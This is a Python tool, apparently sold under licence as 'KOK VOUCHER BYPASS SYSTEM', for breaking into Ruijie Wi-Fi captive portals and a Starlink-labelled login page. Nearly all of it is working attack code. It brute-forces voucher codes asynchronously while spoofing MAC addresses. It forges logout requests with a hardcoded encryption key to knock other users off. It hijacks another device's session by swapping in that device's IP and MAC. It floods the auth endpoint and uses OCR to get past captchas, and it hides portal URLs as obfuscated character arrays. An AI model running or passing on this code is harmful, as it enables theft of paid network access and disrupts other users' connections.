#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import sys
import json
import time
import random
import string
import hashlib
import socket
import asyncio
import aiohttp
import requests
import subprocess
import math
import base64
import urllib.parse
from datetime import datetime, timedelta

# ==================== CAPTCHA SUPPORT ====================
try:
    from PIL import Image
    import pytesseract
    import cv2
    import numpy as np
    CAPTCHA_OCR_AVAILABLE = True
except ImportError:
    CAPTCHA_OCR_AVAILABLE = False

# ==================== GLOBAL ====================
HOME = os.path.expanduser("~")
KICK_FILE = os.path.join(HOME, ".kicked_devices.json")
LICENSE_FILE = os.path.join(HOME, ".license.json")
DEVICE_FILE = os.path.join(HOME, ".config", ".device_id")
FORCE_FILE = os.path.join(HOME, ".force_relogin.json")
USER_SESSION = os.path.join(HOME, ".user_session.json")
SESSION_URL_FILE = ".session_url"
IP_FILE = ".ip"

# ==================== COLORS ====================
RESET = "\033[0m"
_w_ = "\033[1;00m"
_g_ = "\033[1;32m"
_y_ = "\033[1;33m"
_r_ = "\033[1;31m"
_b_ = "\033[1;34m"
_c_ = "\033[1;36m"
_p_ = "\033[1;35m"

ADMIN_CONTACT = "@K0K241120"
SECRET_SALT = "K0K_SECRET_2024_XYZ123"

_G_S_C_ = 0

# ==================== CAPTCHA FUNCTIONS ====================

def preprocess_captcha(img_path):
    """Captcha ပုံကို OCR ဖတ်ရလွယ်အောင် ပြင်ဆင်ခြင်း"""
    try:
        img = cv2.imread(img_path)
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        
        # Noise ဖျက်ခြင်း
        denoised = cv2.medianBlur(gray, 3)
        
        # Thresholding
        _, thresh = cv2.threshold(denoised, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        
        processed_path = img_path.replace(".png", "_processed.png")
        cv2.imwrite(processed_path, thresh)
        return processed_path
    except Exception as e:
        return img_path

def solve_captcha_manual(img_path):
    """Manual Captcha ဖြေရှင်းခြင်း (အသုံးပြုသူကိုယ်တိုင်)"""
    print(f"\n{y}[!] Manual Captcha Required{X}")
    
    try:
        os.system(f"termux-open {img_path}" if os.path.exists("/data/data/com.termux") else f"xdg-open {img_path}")
    except:
        pass
    
    print(f"{c}┌────────────────────────────────────────────────────────────────┐")
    print(f"│  {y}Captcha Image: {img_path}{X}")
    print(f"{c}└────────────────────────────────────────────────────────────────┘")
    
    captcha = input(f"\n{c}[?] Enter captcha code: {X}").strip().upper()
    return captcha

def solve_captcha_auto(img_path):
    """Auto OCR Captcha ဖြေရှင်းခြင်း"""
    if not CAPTCHA_OCR_AVAILABLE:
        print(f"{r}[✘] OCR not available! Install: pip install opencv-python pytesseract pillow{X}")
        print(f"{y}[!] Switching to manual mode...{X}")
        return solve_captcha_manual(img_path)
    
    try:
        processed = preprocess_captcha(img_path)
        captcha = pytesseract.image_to_string(Image.open(processed), 
                                              config='--psm 8 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
        captcha = captcha.strip().upper()
        
        # 4 လုံးပဲယူမယ် (ပုံထဲမှာ XpD8, 260C လိုမျိုး)
        if len(captcha) >= 4:
            captcha = captcha[:4]
        
        print(f"{g}[✓] OCR Result: {captcha}{X}")
        return captcha
    except Exception as e:
        print(f"{r}[✘] OCR Failed: {e}{X}")
        return solve_captcha_manual(img_path)

# ==================== STAR LINK CAPTCHA LOGIN ====================

class StarLinkCaptchaLogin:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
        })
        self.captcha_mode = "auto"  # auto or manual
        self.base_url = "https://starlink.com"  # လက်တွေ့ URL ထည့်ပါ
    
    def get_captcha_image(self, login_type=1):
        """Captcha ပုံရယူခြင်း"""
        try:
            # လက်တွေ့ Captcha URL ထည့်ပါ
            captcha_url = f"{self.base_url}/captcha?type={login_type}&t={int(time.time())}"
            response = self.session.get(captcha_url, stream=True)
            
            if response.status_code == 200:
                img_path = f"captcha_{login_type}_{int(time.time())}.png"
                with open(img_path, 'wb') as f:
                    f.write(response.content)
                return img_path
            return None
        except Exception as e:
            print(f"{r}[✘] Captcha error: {e}{X}")
            return None
    
    def login_with_captcha(self, code, login_type=1):
        """Captcha နဲ့ Login လုပ်ခြင်း"""
        print(f"{c}[*] Trying Login {login_type} with code: {code}{X}")
        
        # Captcha ပုံရယူ
        img_path = self.get_captcha_image(login_type)
        if not img_path:
            return False
        
        # Captcha ဖြေရှင်း
        if self.captcha_mode == "auto":
            captcha_code = solve_captcha_auto(img_path)
        else:
            captcha_code = solve_captcha_manual(img_path)
        
        # ပုံဖိုင်ရှင်း
        if os.path.exists(img_path):
            os.remove(img_path)
        if os.path.exists(img_path.replace(".png", "_processed.png")):
            os.remove(img_path.replace(".png", "_processed.png"))
        
        if not captcha_code or len(captcha_code) < 4:
            print(f"{r}[✘] Invalid captcha!{X}")
            return False
        
        # Login Request
        login_data = {
            "code": code,
            "captcha": captcha_code,
            "timestamp": int(time.time())
        }
        
        try:
            login_url = f"{self.base_url}/api/login{login_type}"
            response = self.session.post(login_url, json=login_data, timeout=10)
            
            if response.status_code == 200:
                result = response.json()
                if result.get("success"):
                    print(f"{g}[✓] Login {login_type} SUCCESS with code: {code}{X}")
                    return True
                else:
                    print(f"{y}[!] Login {login_type} failed: {result.get('message', 'Unknown')}{X}")
                    return False
            else:
                print(f"{r}[✘] HTTP {response.status_code}{X}")
                return False
        except Exception as e:
            print(f"{r}[✘] Error: {e}{X}")
            return False

# ==================== DEVICE ID ====================
def get_device_id():
    os.makedirs(os.path.dirname(DEVICE_FILE), exist_ok=True)
    if os.path.exists(DEVICE_FILE):
        with open(DEVICE_FILE, 'r') as f:
            return f.read().strip()
    
    try:
        result = subprocess.run(['settings', 'get', 'secure', 'android_id'], capture_output=True, text=True, timeout=3)
        if result.returncode == 0 and result.stdout.strip():
            new_id = hashlib.sha256(result.stdout.strip().encode()).hexdigest()[:32].upper()
        else:
            new_id = hashlib.sha256(str(os.urandom(32)).encode()).hexdigest()[:32].upper()
    except:
        new_id = hashlib.sha256(str(os.urandom(32)).encode()).hexdigest()[:32].upper()
    
    with open(DEVICE_FILE, 'w') as f:
        f.write(new_id)
    return new_id

# ==================== GET ROUTER INFO ====================
def get_router_username():
    baseurl = "http://10.44.77.240:2060"
    try:
        req = requests.get(f"{baseurl}/username_get", timeout=5).json()
        return req.get("username", "Not connected")
    except:
        return "Not connected"

def get_remaining_time(username):
    if username == "Not connected":
        return "N/A"
    baseurl = "http://10.44.77.240:2060"
    try:
        params = {"username": username, "usertype": "wifidog"}
        req = requests.get(f"{baseurl}/user/online_info", params=params, timeout=5).json()
        if req.get('data', {}).get('list'):
            remaining = req['data']['list'][0].get('remaining')
            if remaining:
                days = remaining // 86400
                hours = (remaining % 86400) // 3600
                minutes = (remaining % 3600) // 60
                if days > 0:
                    return f"{days}d {hours}h"
                elif hours > 0:
                    return f"{hours}h {minutes}m"
                elif minutes > 0:
                    return f"{minutes}m"
                return f"{remaining}s"
    except:
        pass
    return "Unknown"

def get_gateway_ip():
    try:
        if os.path.exists(IP_FILE):
            with open(IP_FILE, 'r') as f:
                return f.read().strip()
    except:
        pass
    return "Unknown"

# ==================== CHECK FORCE RE-LOGIN ====================
def check_force_relogin(hwid):
    try:
        if os.path.exists(FORCE_FILE):
            with open(FORCE_FILE, 'r') as f:
                data = json.load(f)
                if hwid in data:
                    for f2 in [LICENSE_FILE, USER_SESSION]:
                        if os.path.exists(f2):
                            os.remove(f2)
                    del data[hwid]
                    with open(FORCE_FILE, 'w') as f3:
                        json.dump(data, f3, indent=2)
                    return True
    except:
        pass
    return False

# ==================== KICK CHECK ====================
def is_kicked(hwid):
    try:
        if os.path.exists(KICK_FILE):
            with open(KICK_FILE, 'r') as f:
                data = json.load(f)
                if isinstance(data, list):
                    for item in data:
                        if item.get("hwid") == hwid:
                            return True, item.get("reason", "Kicked")
                        elif isinstance(item, str) and item == hwid:
                            return True, "Kicked"
    except:
        pass
    return False, None

# ==================== LICENSE ====================
def verify_license(key, hwid):
    try:
        parts = key.split('-')
        if len(parts) != 4:
            return None
        prefix, key_hwid, ts, hval = parts
        if prefix != "KOK" or key_hwid != hwid[:12]:
            return None
        timestamp = int(ts)
        expiry = datetime.fromtimestamp(timestamp)
        checker = hashlib.md5(f"{hwid}{timestamp}{SECRET_SALT}".encode()).hexdigest()[:8]
        if hval != checker or datetime.now() > expiry:
            return None
        return expiry
    except:
        return None

def load_license():
    try:
        with open(LICENSE_FILE, 'r') as f:
            d = json.load(f)
            return d.get("key"), d.get("expiry"), d.get("password")
    except:
        return None, None, None

def save_license(key, expiry, password):
    with open(LICENSE_FILE, 'w') as f:
        json.dump({"key": key, "expiry": expiry, "password": password}, f)

def check_password(pwd, hwid):
    _, _, stored = load_license()
    return stored == pwd

def get_license_expiry():
    _, exp, _ = load_license()
    if exp:
        try:
            return datetime.strptime(exp, "%Y-%m-%d %H:%M:%S").strftime("%Y-%m-%d")
        except:
            pass
    return "Not set"

# ==================== SESSION ====================
def has_session(hwid):
    try:
        with open(USER_SESSION, 'r') as f:
            d = json.load(f)
            return d.get("hwid") == hwid and datetime.now() < datetime.fromisoformat(d.get("expiry", "2000-01-01"))
    except:
        return False

def save_session(hwid):
    with open(USER_SESSION, 'w') as f:
        json.dump({"hwid": hwid, "expiry": (datetime.now() + timedelta(hours=24)).isoformat()}, f)

# ==================== HELPER FUNCTIONS ====================
def _d(arr):
    return "".join([chr(i) for i in arr])

def _o_u2():
    return _d([104, 116, 116, 112, 58, 47, 47]) + _d([49, 48, 46, 52, 52, 46]) + _d([55, 55, 46, 50, 52, 48]) + _d([58, 50, 48, 54, 48])

def _o_u3():
    return _d([104, 116, 116, 112, 58, 47, 47]) + _d([49, 57, 50, 46]) + _d([49, 54, 56, 46]) + _d([48, 46, 49])

def _o_u4():
    return _d([104, 116, 116, 112, 115, 58, 47, 47]) + _d([112, 111, 114, 116, 97, 108, 45, 97, 115]) + _d([46, 114, 117, 105, 106, 105, 101, 110, 101, 116]) + _d([119, 111, 114, 107, 115, 46, 99, 111, 109])

def _o_u6():
    return _d([104, 116, 116, 112, 115, 58, 47, 47]) + _d([112, 111, 114, 116, 97, 108, 45, 97, 115, 46, 114, 117, 105, 106, 105, 101, 110, 101, 116, 119, 111, 114, 107, 115, 46, 99, 111, 109]) + _d([47, 97, 112, 105, 47, 97, 117, 116, 104, 47, 118, 111, 117, 99, 104, 101, 114, 47]) + _d([63, 108, 97, 110, 103, 61, 101, 110, 95, 85, 83])

def _o_p():
    return _d([112, 111, 114, 116, 97, 108, 45, 97, 115]) + _d([46, 114, 117, 105, 106, 105, 101]) + _d([110, 101, 116, 119, 111, 114]) + _d([107, 115, 46, 99, 111, 109])

def _clr():
    os.system('clear' if os.name == 'posix' else 'cls')

def _ln():
    try:
        w = os.get_terminal_size()[0]
        print(f"{_y_}─" * w)
    except:
        print(f"{_y_}─" * 60)

def _chk_strg():
    if os.path.exists("/data/data/com.termux/files/usr"):
        storage_path = os.path.expanduser("~/storage")
        if not os.path.exists(storage_path):
            _clr()
            print(f"{_r_}[ ✘ ] Storage permission not configured!{_w_}")
            u_choice = input(f"{_c_}[?] Setup storage? (y/n): {_w_}").strip().lower()
            if u_choice == 'y':
                try:
                    subprocess.run(["termux-setup-storage"])
                    print(f"\n{_y_}[*] Please allow the permission popup...{_w_}")
                    time.sleep(4)
                except:
                    print(f"{_r_}[ ✘ ] Failed.{_w_}")
                    sys.exit()
            elif u_choice == 'n':
                print(f"{_r_}[ ✘ ] Storage permission is mandatory.{_w_}")
                sys.exit()

# ==================== VOUCHER BYPASS CLASSES ====================
def _g_r_m():
    m = [random.randint(0x00, 0xff) for _ in range(6)]
    m[0] = (m[0] | 0x02) & 0xfe 
    return ':'.join(f'{x:02x}' for x in m)

async def _g_s_i(session, s_u, p_s_i):
    if not s_u: return p_s_i
    n_m = _g_r_m()
    if _d([109, 97, 99, 61]) in s_u:
        s_u_s = re.sub(r'mac=[^&]+', f'mac={n_m}', s_u)
    else:
        s_u_s = s_u

    h = {
        'authority': _o_p(),
        'accept': _d([116, 101, 120, 116, 47, 104, 116, 109, 108, 44, 97, 112, 112, 108, 105, 99, 97, 116, 105, 111, 110, 47, 120, 104, 116, 109, 108, 43, 120, 109, 108, 44, 97, 112, 112, 108, 105, 99, 97, 116, 105, 111, 110, 47, 120, 109, 108, 59, 113, 61, 48, 46, 57, 44, 42, 47, 42, 59, 113, 61, 48, 46, 56]),
        'referer': s_u_s,
        'user-agent': _d([77, 111, 122, 105, 108, 108, 97, 47, 53, 46, 48, 32, 40, 76, 105, 110, 117, 120, 59, 32, 65, 110, 100, 114, 111, 105, 100, 32, 49, 48, 59, 32, 75, 41, 32, 65, 112, 112, 108, 105, 101, 87, 101, 98, 75, 105, 116, 47, 53, 51, 55, 46, 51, 54, 32, 40, 75, 72, 84, 77, 76, 44, 32, 108, 105, 107, 101, 32, 71, 101, 99, 107, 111, 41, 32, 67, 104, 114, 111, 109, 101, 47, 49, 51, 57, 46, 48, 46, 48, 46, 48, 32, 77, 111, 98, 105, 108, 101, 32, 83, 97, 102, 97, 114, 105, 47, 53, 51, 55, 46, 51, 54]),
    }
    try:
        async with session.get(s_u_s, headers=h, timeout=5) as req:
            res = str(req.url)
            s_i = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", res).group(1)
            return s_i
    except:
        return p_s_i

class _S_:
    def __init__(self):
        self.baseurl = _o_u2()
        self.username_get_url = self.baseurl + _d([47, 117, 115, 101, 114, 110, 97, 109, 101, 95, 103, 101, 116])
        self.online_info_url = self.baseurl + _d([47, 115, 101, 114, 47, 111, 110, 108, 105, 110, 101, 95, 105, 110, 102, 111])
        self.logout_url = self.baseurl + _d([47, 115, 101, 114, 47, 108, 111, 103, 111, 117, 116])
    
    def set(self):
        print(f"\n{_y_}[*] Initializing Setup...{_w_}")
        time.sleep(0.5)
        
        print(f"{_c_}[*] Unbinding...{_w_}")
        unbind_status = self.unbind()
        if unbind_status:
            print(f"{_g_}[ ✔ ] Unbind successful.{_w_}")
            
        print(f"{_c_}[*] Fetching network...{_w_}")
        try:
            localhost = requests.get(_o_u3(), timeout=10).url
            ip = re.search(_d([103, 119, 95, 97, 100, 100, 114, 101, 115, 115, 61, 40, 46, 42, 63, 41, 38]), localhost).group(1)
            print(f"{_g_}[ ✔ ] Gateway: {ip}{_w_}")
            
            headers = {
                'authority': _o_p(),
                'accept': '*/*',
                'user-agent': _d([77, 111, 122, 105, 108, 108, 97, 47, 53, 46, 48, 32, 40, 76, 105, 110, 117, 120, 59, 32, 65, 110, 100, 114, 111, 105, 100, 32, 49, 48, 59, 32, 75, 41]),
            }
            print(f"{_c_}[*] Extracting session...{_w_}")
            req = requests.get(localhost, headers=headers).text
            session_url = _o_u4() + re.search(_d([104, 114, 101, 102, 61, 39, 40, 46, 42, 63, 41, 39, 60, 47, 115, 99, 114, 105, 112, 116, 62]), req).group(1)
            
            with open(".session_url", "w") as f:
                f.write(session_url)
            with open(".ip", "w") as f:
                f.write(ip)
            
            username = self.username_get()
            if username:
                print(f"{_g_}[ ✔ ] Logged in as: {username}{_w_}")
            
            print(f"{_g_}[ ✔ ] Setup Complete!{_w_}")
        except:
            print(f"{_r_}[ ✘ ] Setup Failed! Make sure you're connected to portal.{_w_}")

    def unbind(self):
        username = self.username_get()
        if not username:
            return False
        online_info = self.get_online_info(username)
        if not online_info:
            return False
        data = self.arrange_data(online_info)
        return self.logout(data, username)

    def username_get(self):
        try:
            req = requests.get(self.username_get_url).json()
            return req.get("username", None)
        except:
            return None
    
    def get_online_info(self, username):
        params = {"username": username, "usertype": "wifidog"}
        try:
            req = requests.get(self.online_info_url, params=params).json()
            return req["data"]["list"][0]
        except:
            return None

    def arrange_data(self, info):
        repmac = info["mac"].replace(":", "")
        repmac = [repmac[i:i+4] for i in range(0, len(repmac), 4)]
        mac_req = ".".join(repmac)
        return {
            "ip": info["ip"],
            "mac": info["mac"],
            "ip_req": info["ip"],
            "mac_req": mac_req
        }

    def get_data(self):
        try:
            return requests.get(self.baseurl).text
        except:
            return None

    def extract_chap(self, data):
        match = re.search(r"chap_id=([^&]+)&chap_challenge=([^']+)", data)
        if not match: return None
        return {"chap_id": match.group(1), "chap_challenge": match.group(2)}
    
    def encrypt_cryptojs(self, auth, enc_key):
        from Crypto.Cipher import AES
        from Crypto.Random import get_random_bytes
        from Crypto.Util.Padding import pad
        
        salt = get_random_bytes(8)
        key_iv = b''
        prev = b''
        while len(key_iv) < 48:
            prev = hashlib.md5(prev + enc_key.encode('utf-8') + salt).digest()
            key_iv += prev
        key = key_iv[:32]
        iv = key_iv[32:48]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        padded_data = pad(auth.encode('utf-8'), AES.block_size)
        cipher_text = cipher.encrypt(padded_data)
        encrypted_data = b"Salted__" + salt + cipher_text
        return base64.b64encode(encrypted_data).decode('utf-8')

    def get_auth(self, username):
        enc_key = "RjYkhwzx$2018!"
        data = self.get_data()
        if not data: return None
        chaps = self.extract_chap(data)
        if not chaps: return None
        chap_id_decoded = urllib.parse.unquote(chaps["chap_id"])
        chap_challenge_decoded = urllib.parse.unquote(chaps["chap_challenge"])
        auth = chap_id_decoded + chap_challenge_decoded + username
        auth_encrypt = self.encrypt_cryptojs(auth, enc_key)
        return auth_encrypt

    def logout(self, data, username):
        auth = self.get_auth(username)
        if not auth: return False
        payload = f"ip={data['ip']}&mac={data['mac']}&ip_req={data['ip_req']}&mac_req={data['mac_req']}&auth={auth}"
        try:
            respond = requests.post(self.logout_url, data=payload).json()
            return respond.get("success", False)
        except:
            return False

async def _l_v(session, session_id, voucher, tracker=None, is_recheck=False):
    global _G_S_C_
    data = {"accessCode": voucher, "sessionId": session_id, "apiVersion": 1}
    post_url = _o_u6()
    
    headers = {
        "authority": _o_p(),
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": _o_u4(),
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
        "user-agent": 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    
    try:
        async with session.post(post_url, headers=headers, json=data, timeout=5) as req:
            response_text = await req.text()
            if tracker: tracker['attempts'] += 1
                
            if "logonUrl" in response_text:
                if not is_recheck:
                    print(f"\n{_g_}[ ✔ ] SUCCESS: {voucher}{_w_}")
                    with open("success.txt", "a") as f: f.write(f"{voucher}\n")
                    _G_S_C_ += 1
                return "SUCCESS"
            elif "STA" in response_text:
                if not is_recheck:
                    print(f"\n{_p_}[ ⚠ ] LIMITED (STA): {voucher}{_w_}")
                    with open("success.txt", "a") as f: f.write(f"{voucher}\n")
                    _G_S_C_ += 1
                return "LIMITED"
            else:
                return "FAILED"
    except:
        return "ERROR"

class _V_C_:
    def __init__(self, mode, code_length):
        try:
            with open(".session_url", "r") as f:
                self.session_url = f.read().strip()
        except:
            print(f"{_r_}[!] Please run Setup [1] first.{_w_}")
            time.sleep(2)
            self.session_url = None
        
        self.mode = mode
        self.code_length = code_length
        self.file = "failed.txt"
        
    async def execute(self):
        if not self.session_url:
            return

        global _G_S_C_
        _G_S_C_ = 0
        _clr()
        print(f"{_g_}[+] Voucher Code searching...{_w_}\n")
                
        checked = set()
        for fname in [self.file, "success.txt"]:
            try:
                with open(fname, "r") as f:
                    for line in f:
                        checked.add(line.strip())
            except:
                pass

        chars = string.digits
        if self.mode == "ascii-lower":
            chars = string.ascii_lowercase
        elif self.mode == "ascii-upper":
            chars = string.ascii_uppercase
        elif self.mode == "ascii-mix":
            chars = string.ascii_letters
        elif self.mode == "alphanumeric":
            chars = string.ascii_lowercase + string.digits

        base = len(chars)
        total = base ** self.code_length
        
        def gen():
            s = total // 2 + 13579
            while math.gcd(s, total) != 1:
                s += 1
            offset = random.randint(0, total - 1)
            for i in range(total):
                idx = (offset + i * s) % total
                tmp = idx
                res = []
                for _ in range(self.code_length):
                    res.append(chars[tmp % base])
                    tmp //= base
                v = "".join(reversed(res))
                if v not in checked:
                    yield v

        gen_iter = gen()
        connector = aiohttp.TCPConnector(limit=100)
        tracker = {'attempts': 0, 'workers': 10, 'stop': False}
        start = time.time()
        
        async def worker(session):
            sid = None
            loop = 0
            while not tracker['stop']:
                if loop % 50 == 0:
                    sid = await _g_s_i(session, self.session_url, sid)
                try:
                    voucher = next(gen_iter)
                except StopIteration:
                    tracker['stop'] = True
                    break
                
                t1 = time.time()
                status = await _l_v(session, sid, voucher, tracker)
                delay = time.time() - t1
                
                if status == "FAILED":
                    with open(self.file, "a") as f:
                        f.write(f"{voucher}\n")
                
                if status == "ERROR" or delay > 2.5:
                    tracker['workers'] = max(5, tracker['workers'] - 2)
                    await asyncio.sleep(0.5)
                elif delay < 1.0:
                    tracker['workers'] = min(100, tracker['workers'] + 1)
                loop += 1
                await asyncio.sleep(0)

        async def manager(session):
            tasks = set()
            while not tracker['stop']:
                tasks = {t for t in tasks if not t.done()}
                for _ in range(tracker['workers'] - len(tasks)):
                    tasks.add(asyncio.create_task(worker(session)))
                await asyncio.sleep(0.5)
            for t in tasks:
                t.cancel()

        async def ui():
            while not tracker['stop']:
                elapsed = time.time() - start
                speed = tracker['attempts'] / elapsed if elapsed > 0 else 0
                print(f"\r{_c_}[⚡] {speed:.0f}/s | Checked: {tracker['attempts']} | Found: {_G_S_C_} | W:{tracker['workers']}{_w_}    ", end="", flush=True)
                await asyncio.sleep(0.5)

        try:
            async with aiohttp.ClientSession(connector=connector) as session:
                await asyncio.gather(manager(session), ui())
        except:
            pass
        
        print(f"\n\n{_g_}[✓] Finished! Found {_G_S_C_} codes.{_w_}")
        input(f"\n{_c_}Press Enter...{_w_}")

class _R_V_:
    async def check(self):
        _clr()
        try:
            codes = list(dict.fromkeys([c.strip() for c in open("success.txt", "r").read().splitlines() if c.strip()]))
        except:
            print(f"{_r_}[!] No saved codes.{_w_}")
            time.sleep(2)
            return
        
        try:
            with open(".session_url", "r") as f:
                s_url = f.read().strip()
        except:
            print(f"{_r_}[!] Please run Setup first.{_w_}")
            time.sleep(2)
            return
        
        print(f"{_y_}[*] Rechecking {len(codes)} codes...{_w_}")
        valid = []
        connector = aiohttp.TCPConnector(limit=50)
        async with aiohttp.ClientSession(connector=connector) as session:
            for i in range(0, len(codes), 2):
                sid = await _g_s_i(session, s_url, None)
                if sid:
                    for v in [codes[i], codes[i+1] if i+1 < len(codes) else None]:
                        if v:
                            status = await _l_v(session, sid, v, is_recheck=True)
                            if status in ["SUCCESS", "LIMITED"]:
                                print(f"{_g_}[✔] {v}{_w_}")
                                valid.append(v)
        with open("success.txt", "w") as f:
            for v in valid:
                f.write(f"{v}\n")
        print(f"{_g_}[✓] Valid: {len(valid)}{_w_}")
        input(f"\n{_c_}Press Enter...{_w_}")

class UrlBypass:
    def __init__(self, portal_url):
        self.portal_url = portal_url
        try:
            with open(".ip", "r") as f:
                self.ip = f.read().strip()
        except:
            self.ip = None

    async def execute(self):
        if not self.ip:
            print(f"{_r_}[!] Run Setup first.{_w_}")
            time.sleep(2)
            return
        _clr()
        print(f"{_g_}[+] Starting Internet Bypass... Press Ctrl+C to stop{_w_}")
        connector = aiohttp.TCPConnector(limit=10)
        async with aiohttp.ClientSession(connector=connector) as session:
            sid = None
            loop = 0
            while True:
                if loop % 5 == 0:
                    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K)'}
                    try:
                        async with session.get(self.portal_url, headers=headers) as req:
                            res = str(req.url)
                            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", res).group(1)
                    except:
                        pass
                code = "".join(random.choice(string.digits) for _ in range(6))
                try:
                    async with session.post(f'http://{self.ip}:2060/wifidog/auth?', params={'token': sid, 'phoneNumber': code}) as req:
                        now = time.strftime('%H:%M:%S')
                        print(f"{_g_}[{now}] Request sent{_w_}")
                except:
                    pass
                loop += 1
                await asyncio.sleep(1)

def fetch_portal_url():
    for gw in ["192.168.110.1", "192.168.0.1", "10.44.77.254"]:
        try:
            res = requests.get(f"http://{gw}", timeout=3, allow_redirects=True)
            if "portal-as.ruijienetworks.com" in res.url:
                return res.url
        except:
            pass
    return None

def get_target_info(limited_code):
    try:
        req = requests.get(f"http://10.44.77.240:2060/user/online_info", params={"username": limited_code, "usertype": "wifidog"}, timeout=5).json()
        if req.get('data', {}).get('list'):
            info = req['data']['list'][0]
            return info.get('ip'), info.get('mac')
    except:
        pass
    return None, None

def transform_portal_url(portal_url, target_ip, target_mac):
    api_url = portal_url.replace("/auth/wifidogAuth/login/?", "/api/auth/wifidog?stage=portal&")
    api_url = api_url.replace("/auth/wifidogAuth/login?", "/api/auth/wifidog?stage=portal&")
    if target_ip:
        api_url = re.sub(r'ip=[^&]*', f'ip={target_ip}', api_url)
    if target_mac:
        api_url = re.sub(r'mac=[^&]*', f'mac={target_mac}', api_url)
    return api_url

# ==================== STAR LINK CAPTCHA MENU ====================
def starlink_captcha_menu():
    sl = StarLinkCaptchaLogin()
    
    _clr()
    print(f"""
{_c_}╔═══════════════════════════════════════════════════════════════╗
║                    STAR LINK CODE FINDER                        ║
║                    (Captcha Support)                            ║
╠═══════════════════════════════════════════════════════════════╣
║  {_y_}Captcha Mode: {sl.captcha_mode.upper()}{_c_}                                              ║
╚═══════════════════════════════════════════════════════════════╝{_w_}
""")
    
    print(f"{_g_}[1] Test Single Code with Captcha{RESET}")
    print(f"{_g_}[2] Brute Force Search (4 digits){RESET}")
    print(f"{_g_}[3] Brute Force Search (4 letters){RESET}")
    print(f"{_g_}[4] Brute Force Search (4 alphanumeric){RESET}")
    print(f"{_g_}[5] Toggle Captcha Mode (Auto/Manual){RESET}")
    print(f"{_r_}[0] Back{RESET}\n")
    
    choice = input(f"{_c_}Select: {_w_}")
    
    if choice == '1':
        code = input(f"{_c_}Enter code to test: {_w_}").strip().upper()
        sl.login_with_captcha(code, 1)
        input(f"\n{_c_}Press Enter...{_w_}")
    
    elif choice == '2':
        print(f"{_g_}[*] Searching 4-digit codes (0000-9999)...{_w_}")
        for code in [f"{i:04d}" for i in range(10000)]:
            print(f"\r{_c_}Testing: {code}{_w_}", end="")
            if sl.login_with_captcha(code, 1):
                print(f"\n{_g_}[★] FOUND: {code}{_w_}")
                with open("starlink_found.txt", "a") as f:
                    f.write(f"{datetime.now()} | {code}\n")
                break
            time.sleep(0.5)
        input(f"\n{_c_}Press Enter...{_w_}")
    
    elif choice == '3':
        chars = string.ascii_uppercase
        print(f"{_g_}[*] Searching 4-letter codes (AAAA-ZZZZ)...{_w_}")
        for a in chars:
            for b in chars:
                for c in chars:
                    for d in chars:
                        code = a+b+c+d
                        print(f"\r{_c_}Testing: {code}{_w_}", end="")
                        if sl.login_with_captcha(code, 1):
                            print(f"\n{_g_}[★] FOUND: {code}{_w_}")
                            with open("starlink_found.txt", "a") as f:
                                f.write(f"{datetime.now()} | {code}\n")
                            input(f"\n{_c_}Press Enter...{_w_}")
                            return
        input(f"\n{_c_}Press Enter...{_w_}")
    
    elif choice == '4':
        chars = string.ascii_uppercase + string.digits
        print(f"{_g_}[*] Searching 4-character codes (0000-ZZZZ)...{_w_}")
        total = len(chars) ** 4
        for i in range(min(total, 100000)):  # ကန့်သတ်ထား
            code = ""
            temp = i
            for _ in range(4):
                code = chars[temp % len(chars)] + code
                temp //= len(chars)
            print(f"\r{_c_}Testing: {code}{_w_}", end="")
            if sl.login_with_captcha(code, 1):
                print(f"\n{_g_}[★] FOUND: {code}{_w_}")
                with open("starlink_found.txt", "a") as f:
                    f.write(f"{datetime.now()} | {code}\n")
                break
            time.sleep(0.3)
        input(f"\n{_c_}Press Enter...{_w_}")
    
    elif choice == '5':
        if sl.captcha_mode == "auto":
            sl.captcha_mode = "manual"
            print(f"{_g_}[✓] Captcha mode: MANUAL{_w_}")
        else:
            if CAPTCHA_OCR_AVAILABLE:
                sl.captcha_mode = "auto"
                print(f"{_g_}[✓] Captcha mode: AUTO (OCR){_w_}")
            else:
                print(f"{_r_}[✘] OCR not available! Install: pip install opencv-python pytesseract pillow{X}")
                print(f"{_y_}[!] Also install Tesseract: pkg install tesseract (Termux){_w_}")
        time.sleep(2)

# ==================== DISPLAY MENU ====================
def display_menu(hwid, username, remaining, licence_expiry):
    term_w = 80
    try:
        term_w = os.get_terminal_size()[0]
    except:
        pass
    
    print(f"{_c_}╔{'═' * (term_w-2)}╗{RESET}")
    print(f"{_c_}║{RESET} {_g_}KOK VOUCHER BYPASS SYSTEM (1 DEVICE){RESET} {' ' * (term_w-42)}{_c_}║{RESET}")
    print(f"{_c_}╠{'═' * (term_w-2)}╣{RESET}")
    print(f"{_c_}║{RESET} {_y_}📱 Device:{RESET} {hwid[:16]}...{' ' * (term_w-38)}{_c_}║{RESET}")
    print(f"{_c_}║{RESET} {_y_}👤 User:{RESET} {username[:25]}{' ' * (term_w-42)}{_c_}║{RESET}")
    print(f"{_c_}║{RESET} {_y_}⏰ Time Left:{RESET} {remaining[:15]}{' ' * (term_w-45)}{_c_}║{RESET}")
    print(f"{_c_}║{RESET} {_y_}📅 License Exp:{RESET} {licence_expiry}{' ' * (term_w-48)}{_c_}║{RESET}")
    print(f"{_c_}╠{'═' * (term_w-2)}╣{RESET}")
    print(f"{_c_}║{RESET}  {_g_}[1] Setup{_w_}      {_g_}[2] Voucher{_w_}      {_g_}[3] Success{_w_}       {_c_}║{RESET}")
